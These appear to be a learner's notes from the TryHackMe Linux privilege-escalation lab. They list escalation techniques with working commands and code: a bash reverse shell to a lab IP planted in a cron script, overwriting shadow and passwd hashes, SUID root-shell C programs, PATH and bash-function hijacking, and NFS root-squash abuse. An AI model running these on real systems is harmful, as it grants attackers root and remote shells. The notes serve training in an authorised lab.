# PrivEsc

link to the room: [`https://tryhackme.com/room/linuxprivesc`]

`export IP=10.10.112.251`

## TASK

### Service exploit

- show services running as root 
command: `ps aux | grep root`

### Readable /etc/shadow
- crack the password of root user sha512

### Writable /etc/shadow
command: `mkpasswd -m sha-512 goodluck`

### Writable /etc/passwd
- replace the x for the passwoed by the traditional crpyt (des) generated by openssl
command: `openssl passwd goodluck`

### Sudo shell escape sequece

command: `sudo -l` allowed commands for root.

visit : `https://gtfobins.github.io` to show the instructions

### Sudo envs
- see if there any ENVs in env_keep: LD_PRELOAD and LD_LIBRARY_PATH
command: `sudo -l`

### CronJobs file permissions
command: `cat /etc/crontab`

- reverse shell on overwrite.sh
```
#!/bin/bash
bash -i >& /dev/tcp/10.9.2.177/4444 0>&1
```

### CronJobs PATH ENV

- check if PATH is in crontab
command: `cat /etc/crontab`

### Cronjobs Wildcards

- if tar used a wildcard for controlled directory we can used checkpoint feature look at `https://gtfobins.github.io/tar` it will expand files as tar options.

### SUID/SGID executable known exploits

- find all executable files with SUID/SGID and search for exploit in exploit-db

command: `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

### SUID/SGID shared object injection
- SUID file: /usr/local/bin/suid-so
command: `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

### SUID/SGID ENVs

- search a relative path for a programs with strings or strace:

output: 
`service apache2 start`

- spawn a shell using a local tampered service file

service content:

```
int main() {
	setuid(0);
	system("/bin/bash -p");
}
```
command: `gcc -o service service.c`

exploit command: `PATH=.:$PATH /usr/local/bin/suid-env`

### SUID/SGID abuse shell feature

- see the bash version `/bin/bash --version` < 4.2-048
- create a function with a full path
```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
---

### password & keys config files

- show the content of `.bash_history`

- check if you can access ssh private key `/.ssh/root_key`

command: `ssh -i root_key root@$IP`


### NFS(Network file system) root squash

- login as root in attacker machine and mount shared nfs 
```
mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
```
- create the rootbash.c
```
int main() {
	system("/bin/bash -p");
}
```
```
# target machine
gcc rootbash.c -o rootbash

# attacker machine
chmod +xs rootbash
```


### Kernel exploits

- tool: `Linux Exploit Suggester 2`





